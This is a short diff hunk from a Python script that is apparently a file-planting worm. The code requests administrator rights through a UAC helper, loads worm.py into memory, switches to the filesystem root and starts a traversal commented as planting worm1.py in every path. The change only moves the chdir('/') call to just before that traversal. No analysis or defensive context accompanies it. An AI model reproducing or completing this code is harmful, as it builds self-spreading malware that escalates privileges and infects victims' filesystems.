@@ -5,8 +5,6 @@ import UAC
 if not UAC.isUserAdmin():
     UAC.runAsAdmin()
 
-chdir('/')
-
 MEMORY_PER_RUN = 4000
 WORM_BIN = b""
 with open("worm.py", "rb") as infile:
@@ -16,6 +14,7 @@ with open("worm.py", "rb") as infile:
         break
     WORM_BIN += info
 
+chdir('/')
 def traverse(path):
     # plant worm1.py in the absolute path currently on
     try:
